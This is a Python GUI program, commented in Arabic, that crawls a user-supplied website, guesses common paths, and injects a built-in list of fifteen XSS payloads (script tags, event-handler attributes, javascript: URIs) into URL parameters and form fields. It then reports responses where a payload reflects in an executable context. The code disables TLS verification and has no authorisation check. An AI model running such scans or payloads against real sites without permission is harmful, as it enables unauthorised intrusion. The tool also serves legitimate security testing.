import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, unquote
from bs4 import BeautifulSoup, Comment
import warnings
try:
    # تجاهل التحذير عند تحليل مستندات XML كمستندات HTML
    from html.parser import XMLParsedAsHTMLWarning
    warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
except Exception:
    pass
import threading
import time
import random
import urllib3
import re
import html
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# تعطيل تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XSSScannerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("أداة فحص ثغرات XSS المتقدمة")
        self.root.geometry("900x700")
        self.root.resizable(True, True)
        
        # المتغيرات
        self.target_url = tk.StringVar()
        self.max_pages = tk.IntVar(value=20)
        self.scanning = False
        self.found_vulnerabilities = []
        # جلسة HTTP مشتركة بمحاولات إعادة وتراجع تدريجي
        self.session = self.create_session()
        
        # إنشاء الواجهة
        self.create_widgets()
        
    def create_widgets(self):
        # إطار العنوان
        title_frame = ttk.Frame(self.root)
        title_frame.pack(pady=10, fill=tk.X)
        
        title_label = ttk.Label(title_frame, text="أداة فحص ثغرات XSS المتقدمة", 
                               font=("Arial", 16, "bold"))
        title_label.pack()
        
        # إطار الإدخال
        input_frame = ttk.Frame(self.root)
        input_frame.pack(pady=10, fill=tk.X, padx=20)
        
        ttk.Label(input_frame, text="رابط الموقع:").grid(row=0, column=0, sticky=tk.W, pady=5)
        url_entry = ttk.Entry(input_frame, textvariable=self.target_url, width=60)
        url_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.EW)
        
        # إطار الخيارات
        options_frame = ttk.Frame(self.root)
        options_frame.pack(pady=5, fill=tk.X, padx=20)
        
        ttk.Label(options_frame, text="عدد الصفحات للفحص:").pack(side=tk.LEFT, padx=5)
        pages_spinbox = ttk.Spinbox(options_frame, from_=1, to=1000, width=10, 
                                   textvariable=self.max_pages)
        pages_spinbox.pack(side=tk.LEFT, padx=5)
        
        self.deep_scan_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="فحص عميق (Deep Scan)", 
                       variable=self.deep_scan_var).pack(side=tk.LEFT, padx=10)
        
        self.forms_scan_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(options_frame, text="فحص النماذج (Forms)", 
                       variable=self.forms_scan_var).pack(side=tk.LEFT, padx=10)
        
        # أزرار التحكم
        button_frame = ttk.Frame(self.root)
        button_frame.pack(pady=10, fill=tk.X, padx=20)
        
        self.scan_button = ttk.Button(button_frame, text="بدء الفحص", command=self.start_scan)
        self.scan_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = ttk.Button(button_frame, text="إيقاف الفحص", 
                                     command=self.stop_scan, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        clear_button = ttk.Button(button_frame, text="مسح النتائج", command=self.clear_results)
        clear_button.pack(side=tk.LEFT, padx=5)
        
        # شريط التقدم
        self.progress = ttk.Progressbar(self.root, mode='indeterminate')
        self.progress.pack(pady=5, fill=tk.X, padx=20)
        
        # إطار إحصائيات الفحص
        stats_frame = ttk.Frame(self.root)
        stats_frame.pack(pady=5, fill=tk.X, padx=20)
        
        self.stats_label = ttk.Label(stats_frame, text="الحالة: جاهز للفحص")
        self.stats_label.pack(anchor=tk.W)
        
        # إطار النتائج
        results_frame = ttk.Frame(self.root)
        results_frame.pack(pady=10, fill=tk.BOTH, expand=True, padx=20)
        
        ttk.Label(results_frame, text="النتائج:").pack(anchor=tk.W)
        
        self.results_text = scrolledtext.ScrolledText(results_frame, height=25, width=90)
        self.results_text.pack(fill=tk.BOTH, expand=True, pady=5)
        
        # تخصيص النص
        self.results_text.tag_configure("vulnerable", foreground="red", font=("Arial", 10, "bold"))
        self.results_text.tag_configure("safe", foreground="green")
        self.results_text.tag_configure("info", foreground="blue")
        self.results_text.tag_configure("warning", foreground="orange")
        self.results_text.tag_configure("debug", foreground="gray")
        
    def start_scan(self):
        url = self.target_url.get().strip()
        if not url:
            messagebox.showerror("خطأ", "يرجى إدخال رابط الموقع")
            return
            
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
            self.target_url.set(url)
            
        self.scanning = True
        self.scan_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.progress.start()
        
        self.found_vulnerabilities = []
        self.results_text.delete(1.0, tk.END)
        
        max_pages = self.max_pages.get()
        self.log_message("info", "بدء فحص الموقع: " + url + "\n")
        self.log_message("info", f"عدد الصفحات المطلوب فحصها: {max_pages}\n")
        self.log_message("info", f"فحص عميق: {'مفعل' if self.deep_scan_var.get() else 'معطل'}\n")
        self.log_message("info", f"فحص النماذج: {'مفعل' if self.forms_scan_var.get() else 'معطل'}\n")
        self.log_message("info", "="*50 + "\n")
        
        # تشغيل الفحص في thread منفصل
        scan_thread = threading.Thread(target=self.scan_website, args=(url, max_pages))
        scan_thread.daemon = True
        scan_thread.start()
        
    def stop_scan(self):
        self.scanning = False
        self.scan_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.progress.stop()
        self.log_message("info", "\nتم إيقاف الفحص\n")
        
    def clear_results(self):
        self.results_text.delete(1.0, tk.END)
        
    def log_message(self, tag, message):
        self.results_text.insert(tk.END, message, tag)
        self.results_text.see(tk.END)
        self.root.update_idletasks()
        
    def update_stats(self, message):
        self.stats_label.config(text=message)
        self.root.update_idletasks()
        
    def create_session(self):
        """إنشاء جلسة Requests مع إعادة محاولات وتراجع تدريجي لتقليل أخطاء المهلة."""
        session = requests.Session()
        session.verify = False
        retries = Retry(
            total=3,
            connect=3,
            read=3,
            backoff_factor=0.8,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "OPTIONS", "POST"]
        )
        adapter = HTTPAdapter(max_retries=retries, pool_maxsize=20)
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
            'Cache-Control': 'no-cache'
        })
        return session
        
    def scan_website(self, base_url, max_pages):
        try:
            self.update_stats("جاري جمع الصفحات...")
            
            # جمع جميع الصفحات
            all_pages = self.crawl_website(base_url, max_pages)
            
            self.log_message("info", f"تم جمع {len(all_pages)} صفحة للفحص\n\n")
            self.update_stats(f"جاري فحص {len(all_pages)} صفحة...")
            
            # فحص كل صفحة
            for i, page_url in enumerate(all_pages):
                if not self.scanning:
                    break
                    
                self.update_stats(f"جاري فحص الصفحة {i+1}/{len(all_pages)}")
                self.log_message("info", f"فحص الصفحة {i+1}/{len(all_pages)}: {page_url}\n")
                
                # فحص المعلمات في الرابط
                self.test_url_parameters(page_url)
                
                # فحص النماذج إذا كان مفعل
                if self.forms_scan_var.get():
                    self.test_forms(page_url)
                
            # عرض النتائج النهائية
            self.show_final_results()
            
        except Exception as e:
            self.log_message("warning", f"خطأ أثناء الفحص: {str(e)}\n")
        finally:
            self.scanning = False
            self.scan_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.progress.stop()
            self.update_stats("الفحص انتهى")
            
    def crawl_website(self, base_url, max_pages):
        visited = set()
        to_visit = [base_url]
        all_links = set([base_url])
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        
        while to_visit and len(all_links) < max_pages and self.scanning:
            current_url = to_visit.pop(0)
            
            if current_url in visited:
                continue
                
            try:
                self.update_stats(f"جاري جمع الصفحات ({len(all_links)}/{max_pages})")
                self.log_message("debug", f"زيارة: {current_url}\n")
                
                response = self.session.get(current_url, timeout=(5, 22), headers=headers, allow_redirects=True)
                # حاول استخدام الترميز الصحيح لتجنب رموز الاستبدال
                try:
                    response.encoding = response.apparent_encoding or response.encoding
                except Exception:
                    pass
                
                if response.status_code == 200:
                    visited.add(current_url)
                    
                    # استخراج الروابط
                    soup = BeautifulSoup(response.text, 'html.parser')
                    new_links = self.extract_all_links(soup, base_url)
                    
                    for link in new_links:
                        if link not in all_links and len(all_links) < max_pages:
                            all_links.add(link)
                            to_visit.append(link)
                            self.log_message("debug", f"  - اكتشاف: {link}\n")
                            
            except Exception as e:
                self.log_message("warning", f"خطأ في زيارة {current_url}: {str(e)}\n")
                visited.add(current_url)
        
        self.log_message("info", f"\nتفاصيل الصفحات المجمعة:\n")
        for i, page in enumerate(list(all_links)[:10], 1):
            self.log_message("info", f"  {i}. {page}\n")
        
        if len(all_links) > 10:
            self.log_message("info", f"  ... و {len(all_links) - 10} صفحة أخرى\n")
                
        return list(all_links)
    
    def extract_all_links(self, soup, base_url):
        links = set()
        
        # استخراج جميع الروابط من العلامات المختلفة
        tags_to_check = [
            ('a', 'href'),
            ('link', 'href'),
            ('img', 'src'),
            ('script', 'src'),
            ('iframe', 'src'),
            ('form', 'action'),
            ('area', 'href'),
            ('frame', 'src')
        ]
        
        for tag_name, attr in tags_to_check:
            for tag in soup.find_all(tag_name, {attr: True}):
                url = tag[attr]
                full_url = urljoin(base_url, url)
                if self.is_valid_url(full_url, base_url):
                    links.add(full_url)
        
        # استخراج الروابط من محتوى النص (للاكتشاف الروابط الديناميكية)
        text_content = soup.get_text()
        url_pattern = r'https?://[^\s<>"\'{}|\\^`\[\]]+'
        found_urls = re.findall(url_pattern, text_content)
        
        for url in found_urls:
            full_url = urljoin(base_url, url)
            if self.is_valid_url(full_url, base_url):
                links.add(full_url)
                
        # إنشاء روابط محتملة بناءً على بنية الموقع
        common_paths = self.generate_common_paths(base_url)
        for path in common_paths:
            links.add(path)
        
        return list(links)
    
    def generate_common_paths(self, base_url):
        """إنشاء روابط شائعة بناءً على بنية المواقع"""
        common_paths = set()
        parsed_base = urlparse(base_url)
        
        # الصفحات الشائعة
        common_pages = [
            'index.php', 'index.html', 'home.php', 'main.php',
            'about.php', 'contact.php', 'contactus.php',
            'search.php', 'search', 'products.php', 'services.php',
            'blog.php', 'news.php', 'articles.php',
            'login.php', 'register.php', 'signup.php',
            'admin.php', 'admin/', 'dashboard.php',
            'user.php', 'profile.php', 'account.php',
            'search_result.php'
        ]
        
        # إضافة المعلمات الشائعة
        common_params = [
            'id=', 'page=', 'category=', 'product=', 'item=',
            'view=', 'show=', 'display=', 'type=',
            'search=', 'q=', 'query=', 's=',
            'user=', 'author=', 'member=',
            'searchstring=', 'v='
        ]
        
        # إنشاء روابط الصفحات الشائعة
        for page in common_pages:
            common_paths.add(f"{parsed_base.scheme}://{parsed_base.netloc}/{page}")
        
        # إنشاء روابط بمعلمات
        for param in common_params:
            common_paths.add(f"{parsed_base.scheme}://{parsed_base.netloc}/index.php?{param}1")
            common_paths.add(f"{parsed_base.scheme}://{parsed_base.netloc}/search.php?{param}test")
            common_paths.add(f"{parsed_base.scheme}://{parsed_base.netloc}/search_result.php?{param}test")
        
        return list(common_paths)
    
    def is_valid_url(self, url, base_url):
        try:
            parsed_url = urlparse(url)
            parsed_base = urlparse(base_url)
            
            # التأكد من أن الرابط ينتمي لنفس النطاق
            if parsed_url.netloc != parsed_base.netloc:
                return False
                
            if not parsed_url.scheme in ['http', 'https']:
                return False
                
            # تجاهل أنواع الملفات الشائعة
            excluded_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', 
                                 '.pdf', '.doc', '.docx', '.zip', '.rar', '.ico',
                                 '.woff', '.ttf', '.eot', '.svg', '.mp4', '.mp3',
                                 '.avi', '.mov', '.wmv']
            if any(parsed_url.path.lower().endswith(ext) for ext in excluded_extensions):
                return False
                
            # تجاهل روابط البريد الإلكتروني وروابط JavaScript
            if url.startswith(('mailto:', 'tel:', 'javascript:', '#')):
                return False
                
            return True
            
        except:
            return False
    
    def test_url_parameters(self, url):
        try:
            parsed_url = urlparse(url)
            if not parsed_url.query:
                self.log_message("debug", "  - لا توجد معلمات في الرابط\n")
                return
                
            query_params = parse_qs(parsed_url.query)
            
            payloads = self.get_xss_payloads()
            
            self.log_message("info", f"  - فحص {len(query_params)} معلمة في الرابط\n")
            
            for param in query_params:
                if not self.scanning:
                    break
                    
                self.log_message("debug", f"    - فحص المعلمة: {param}\n")
                    
                for payload in payloads[:10]:
                    if not self.scanning:
                        break
                        
                    test_url = self.create_test_url(url, param, payload)
                    
                    try:
                        headers = {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                        }
                        
                        response = self.session.get(test_url, timeout=(5, 18), headers=headers, allow_redirects=True)
                        try:
                            response.encoding = response.apparent_encoding or response.encoding
                        except Exception:
                            pass
                        
                        # التحقق المتقدم من الثغرة (تنفيذ/تعقيم)
                        is_exec, details = self.advanced_xss_check(response, payload, param)
                        if is_exec:
                            vulnerability = {
                                'url': test_url,
                                'payload': payload,
                                'type': 'URL Parameter',
                                'parameter': param,
                                'page': url,
                                'details': details
                            }
                            self.report_vulnerability(vulnerability)
                            break
                        else:
                            # انعكاس معقم: نوثق التفاصيل بدقة
                            if details.get('context') == 'sanitized_reflection':
                                self.log_message("info", "      (انعكاس معقم) لا تنفيذ: " + details.get('reason', '') + "\n")
                                if details.get('escaped'):
                                    self.log_message("info", "        دلائل التعقيم: تم تحويل محارف HTML\n")
                                snippet = details.get('snippet')
                                if snippet:
                                    self.log_message("debug", "        مقطع:\n")
                                    self.log_message("debug", f"        {snippet}\n")
                            
                    except Exception as e:
                        continue
                        
        except Exception as e:
            self.log_message("warning", f"  - خطأ في فحص معلمات الرابط: {str(e)}\n")
    
    def test_forms(self, url):
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            
            response = self.session.get(url, timeout=(5, 20), headers=headers, allow_redirects=True)
            try:
                response.encoding = response.apparent_encoding or response.encoding
            except Exception:
                pass
            soup = BeautifulSoup(response.text, 'html.parser')
            
            forms = soup.find_all('form')
            
            if not forms:
                self.log_message("debug", "  - لا توجد نماذج في الصفحة\n")
                return
                
            self.log_message("info", f"  - فحص {len(forms)} نموذج في الصفحة\n")
            
            for form in forms:
                if not self.scanning:
                    break
                    
                self.test_form(url, form)
                    
        except Exception as e:
            self.log_message("warning", f"  - خطأ في فحص النماذج: {str(e)}\n")
    
    def test_form(self, base_url, form):
        try:
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            form_url = urljoin(base_url, action)
            
            inputs = form.find_all(['input', 'textarea', 'select'])
            form_data = {}
            
            # إنشاء بيانات افتراضية للنموذج
            for input_tag in inputs:
                input_name = input_tag.get('name')
                if input_name and input_tag.get('type') != 'submit':
                    input_type = input_tag.get('type', '').lower()
                    
                    if input_type in ['text', 'textarea', 'search', 'url', 'email', 'password']:
                        form_data[input_name] = "test"
                    elif input_type in ['hidden']:
                        form_data[input_name] = input_tag.get('value', '')
                    elif input_type in ['checkbox', 'radio']:
                        form_data[input_name] = "on"
                    else:
                        form_data[input_name] = "1"
            
            if not form_data:
                self.log_message("debug", "    - النموذج لا يحتوي على حقول إدخال\n")
                return
                
            # اختبار النموذج مع البايلودات
            payloads = self.get_xss_payloads()
            
            self.log_message("debug", f"    - فحص {len(form_data)} حقل في النموذج\n")
            
            for input_name in form_data:
                if not self.scanning:
                    break
                    
                self.log_message("debug", f"      - فحص الحقل: {input_name}\n")
                    
                for payload in payloads[:8]:
                    if not self.scanning:
                        break
                        
                    test_data = form_data.copy()
                    test_data[input_name] = payload
                    
                    try:
                        headers = {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                            'Referer': base_url
                        }
                        
                        if method == 'post':
                            response = self.session.post(form_url, data=test_data, timeout=(5, 18), headers=headers, allow_redirects=True)
                        else:
                            response = self.session.get(form_url, params=test_data, timeout=(5, 18), headers=headers, allow_redirects=True)
                        try:
                            response.encoding = response.apparent_encoding or response.encoding
                        except Exception:
                            pass
                        
                        # التحقق المتقدم من الثغرة (تنفيذ/تعقيم)
                        is_exec, details = self.advanced_xss_check(response, payload, input_name)
                        if is_exec:
                            vulnerability = {
                                'url': form_url,
                                'payload': payload,
                                'type': 'Form Input',
                                'parameter': input_name,
                                'page': base_url,
                                'method': method.upper(),
                                'details': details
                            }
                            self.report_vulnerability(vulnerability)
                            break
                        else:
                            if details.get('context') == 'sanitized_reflection':
                                self.log_message("info", "      (انعكاس معقم) لا تنفيذ: " + details.get('reason', '') + "\n")
                                if details.get('escaped'):
                                    self.log_message("info", "        دلائل التعقيم: تم تحويل محارف HTML\n")
                                snippet = details.get('snippet')
                                if snippet:
                                    self.log_message("debug", "        مقطع:\n")
                                    self.log_message("debug", f"        {snippet}\n")
                            
                    except Exception as e:
                        continue
                        
        except Exception as e:
            self.log_message("warning", f"    - خطأ في فحص النموذج: {str(e)}\n")
    
    def advanced_xss_check(self, response, payload, parameter_name):
        """
        تحقق متقدم من ثغرات XSS لتجنب الإيجابيات الكاذبة
        يعيد (is_executable, details)
        details يتضمن سياق التنفيذ أو سبب التعقيم مع مقطع دلالي
        """
        text = response.text or ""
        try:
            decoded_once = unquote(text)
            decoded_twice = unquote(decoded_once)
        except Exception:
            decoded_once = text
            decoded_twice = text
        html_unescaped = html.unescape(decoded_twice)

        # استخدم تحليلين: خام لتمييز السياقات القابلة للتنفيذ بدقة، وغير مهرب لعرض المقاطع فقط
        soup_raw = BeautifulSoup(text, 'html.parser')
        soup_unescaped = BeautifulSoup(html_unescaped, 'html.parser')

        # فائدة: مقطع سياقي حول أول ظهور للبايلود
        def get_context_snippet(source_text, marker, radius=140):
            try:
                idx = source_text.lower().find(marker.lower())
                if idx == -1:
                    return ""
                start = max(0, idx - radius)
                end = min(len(source_text), idx + len(marker) + radius)
                snippet = source_text[start:end]
                return snippet
            except Exception:
                return ""

        # 1) فحص سمات قد تؤدي لتنفيذ
        for tag in soup_raw.find_all():
            for attr, value in tag.attrs.items():
                if isinstance(value, str) and payload in value:
                    is_event_attr = attr.startswith('on')
                    is_danger_src = attr in ['src', 'href'] and value.strip().lower().startswith('javascript:')
                    if is_event_attr or is_danger_src:
                        details = {
                            'context': 'attribute',
                            'tag': tag.name,
                            'attribute': attr,
                            'value_fragment': value,
                            'snippet': get_context_snippet(str(tag), payload)
                        }
                        return True, details

        # 2) داخل سكربت
        for script in soup_raw.find_all('script'):
            content = (script.string or script.text or "")
            if payload in content:
                details = {
                    'context': 'script',
                    'tag': 'script',
                    'attribute': None,
                    'value_fragment': None,
                    'snippet': get_context_snippet(content, payload)
                }
                return True, details

        # 3) انعكاس داخل سمات غير خطرة (value, title, data-*) يعتبر آمنًا
        # إذا كان البايلود موجودًا فقط داخل قيمة سمة مقتبسة وغير حدث/رابط جافاسكربت، فهو انعكاس معقم
        for tag in soup_raw.find_all():
            for attr, value in tag.attrs.items():
                if isinstance(value, str) and payload in value:
                    is_event_attr = attr.startswith('on')
                    is_href_src = attr in ['src', 'href']
                    is_js_scheme = value.strip().lower().startswith('javascript:') if is_href_src else False
                    if not is_event_attr and not is_js_scheme:
                        details = {
                            'context': 'sanitized_reflection',
                            'reason': 'payload reflected inside quoted attribute; not an executable context',
                            'snippet': get_context_snippet(str(tag), payload),
                            'escaped': ('&lt;' in response.text or '&gt;' in response.text or '&quot;' in response.text or '&#x3c;' in response.text.lower())
                        }
                        return False, details

        # 4) انعكاس في HTML غير مهرب (معلوماتي فقط):
        # لتجنب الإيجابيات الكاذبة الناتجة عن فك الهروب ثم إعادة التحليل، لا نعتبره قابلاً للتنفيذ
        # ما لم يتم كشف سياق تنفيذي صريح في التحليل الخام أعلاه.
        # قبل تخفيض الحالة، إذا كان البايلود نفسه يحتوي على بنية تنفيذية ظاهرة وظهر كما هو في المصدر الخام،
        # اعتبره قابلاً للتنفيذ (مثل إدراج <script> أو سمات أحداث أو javascript: داخل DOM).
        exec_markers = [
            r"<\s*script[\s>]|</\s*script\s*>",
            r"\bon[a-zA-Z]+\s*=",  # onerror=, onload=, onclick= ...
            r"javascript:\s*"
        ]
        if payload in text:
            if any(re.search(marker, payload, flags=re.IGNORECASE) for marker in exec_markers):
                details = {
                    'context': 'html',
                    'tag': None,
                    'attribute': None,
                    'value_fragment': None,
                    'snippet': get_context_snippet(text, payload)
                }
                return True, details

        if payload in html_unescaped:
            details = {
                'context': 'sanitized_reflection',
                'reason': 'payload appears in HTML but without executable context in raw parse',
                'snippet': get_context_snippet(html_unescaped, payload),
                'escaped': ('&lt;' in response.text or '&gt;' in response.text or '&quot;' in response.text or '&#x3c;' in response.text.lower())
            }
            return False, details

        # 5) انعكاس معقم/نصي فقط: يظهر كنص أو محول كيانات ولا يؤدي لتنفيذ
        reflected = (payload in html_unescaped) or (payload in decoded_twice) or (payload in text)
        if reflected:
            # تحقق من دلائل التعقيم: تحويل < إلى &lt; أو إزالة سمات الأحداث
            likely_escaped = ('&lt;' in response.text or '&gt;' in response.text or '&quot;' in response.text or '&#x3c;' in response.text.lower())
            details = {
                'context': 'sanitized_reflection',
                'reason': 'payload reflected as text or HTML-escaped; no executable context',
                'snippet': get_context_snippet(response.text, payload) or get_context_snippet(html_unescaped, payload),
                'escaped': likely_escaped
            }
            return False, details

        # 6) لم يتم العثور على انعكاس أصلاً
        return False, {}
    
    def get_xss_payloads(self):
        """قائمة شاملة من بايلودات XSS للاختبار"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "onmouseover=alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "<embed src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>"
        ]
    
    def create_test_url(self, url, param, payload):
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        query_params[param] = [payload]
        
        new_query = urlencode(query_params, doseq=True)
        new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
        return new_url
    
    def report_vulnerability(self, vulnerability):
        # التحقق من عدم وجود ثغرة مكررة
        for existing_vuln in self.found_vulnerabilities:
            if (existing_vuln['page'] == vulnerability['page'] and 
                existing_vuln['parameter'] == vulnerability['parameter']):
                return
        
        self.found_vulnerabilities.append(vulnerability)
        self.log_message("vulnerable", f"  [✓] تم اكتشاف ثغرة XSS!\n")
        self.log_message("vulnerable", f"      النوع: {vulnerability['type']}\n")
        self.log_message("vulnerable", f"      المعلمة: {vulnerability['parameter']}\n")
        self.log_message("vulnerable", f"      البايلود: {vulnerability['payload']}\n")
        self.log_message("vulnerable", f"      الصفحة: {vulnerability['page']}\n")
        if 'method' in vulnerability:
            self.log_message("vulnerable", f"      الأسلوب: {vulnerability['method']}\n")
        # تفاصيل السياق إن وجدت
        details = vulnerability.get('details') or {}
        if details:
            ctx = details.get('context')
            if ctx:
                self.log_message("vulnerable", f"      السياق: {ctx}\n")
            tag = details.get('tag')
            attr = details.get('attribute')
            if tag or attr:
                self.log_message("vulnerable", f"      العنصر/السمة: {tag or '-'} / {attr or '-'}\n")
            val = details.get('value_fragment')
            if val:
                self.log_message("vulnerable", f"      قيمة/نص جزئي: {val[:180]}\n")
            snippet = details.get('snippet')
            if snippet:
                self.log_message("vulnerable", "      مقطع سياقي:\n")
                self.log_message("vulnerable", f"        {snippet[:400]}\n")
        self.log_message("vulnerable", f"      الرابط الكامل: {vulnerability['url']}\n")
        self.log_message("vulnerable", "-" * 40 + "\n")
        
    def show_final_results(self):
        self.log_message("info", "\n" + "="*60 + "\n")
        self.log_message("info", "نتائج الفحص النهائية:\n")
        self.log_message("info", "="*60 + "\n")
        
        if self.found_vulnerabilities:
            self.log_message("vulnerable", f"تم العثور على {len(self.found_vulnerabilities)} ثغرة XSS:\n\n")
            
            for i, vuln in enumerate(self.found_vulnerabilities, 1):
                self.log_message("vulnerable", f"الثغرة #{i}:\n")
                self.log_message("vulnerable", f"  النوع: {vuln['type']}\n")
                self.log_message("vulnerable", f"  المعلمة: {vuln['parameter']}\n")
                self.log_message("vulnerable", f"  البايلود: {vuln['payload']}\n")
                self.log_message("vulnerable", f"  الصفحة: {vuln['page']}\n")
                self.log_message("vulnerable", f"  الرابط: {vuln['url']}\n\n")
        else:
            self.log_message("safe", "لم يتم العثور على أي ثغرات XSS\n")
            self.log_message("info", "ملاحظة: قد تحتاج الثغرات إلى فحص يدوي إضافي\n")

def main():
    root = tk.Tk()
    app = XSSScannerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()